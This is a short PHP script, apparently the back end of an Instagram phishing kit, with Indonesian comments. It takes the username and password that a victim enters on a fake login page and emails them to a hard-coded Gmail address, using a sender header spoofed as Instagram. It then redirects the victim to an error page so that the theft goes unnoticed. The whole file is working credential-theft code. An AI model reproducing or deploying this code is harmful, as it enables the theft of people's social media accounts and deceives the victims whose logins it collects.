<?php

$subjek = 'Hasil Phising Instagram';
$mailto = 'sicocorobert1212@gmail.com';

$username = $_POST['username'];
$password = $_POST['password'];

$body = <<<EOD
<br><hr><br>
±====[PHISING INSTAGRAM]====± <br />

<br />
Username Instagram : <font color="blue">$username</font> <br />
Password : <font color="red">$password</font> <br />
<br />

±========[RENDYMASTEROGAR.COM]=========±
EOD;

$headers = "From: Instagram@JAMET.com\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
?>
<?php
$random = rand(1000,5000);
?>
<script LANGUAGE="JavaScript">
<!--
window.location="masuk_eror.php";
// -->
</script>